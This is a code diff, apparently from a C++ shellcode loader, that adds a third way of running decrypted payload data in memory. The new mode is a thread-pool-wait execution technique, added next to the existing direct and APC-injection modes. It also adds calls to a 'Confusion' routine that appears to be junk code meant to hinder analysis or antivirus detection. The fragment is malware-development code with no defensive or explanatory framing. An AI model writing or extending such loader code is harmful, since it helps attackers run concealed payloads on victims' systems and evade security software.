@@ -114,11 +114,15 @@ void Launch::launchFunction(std::string function_mode, const unsigned char *decr
         this->printMode("Function 1");
         this->startBase(MasterEncoderForDirectlyLoader::function1, decryptedData, byteLength);
         Confusion::generateAndSortArray();
-
     } else if (function_mode == "2") {
         Confusion::generateAndSortArray();
         this->printMode("Function 2");
         this->startBase(MasterEncoderForApcLoadder::function1, decryptedData, byteLength);
+        Confusion::generateAndSortArray();
+    }else if (function_mode == "3") {
+        Confusion::generateAndSortArray();
+        this->printMode("Function 3");
+        this->startBase(MasterEncoderForCreateThreatPoolWaitLoader::function1, decryptedData, byteLength);
         Confusion::generateAndSortArray();
     } else {
         std::cout << "Invalid function mode!" << std::endl;
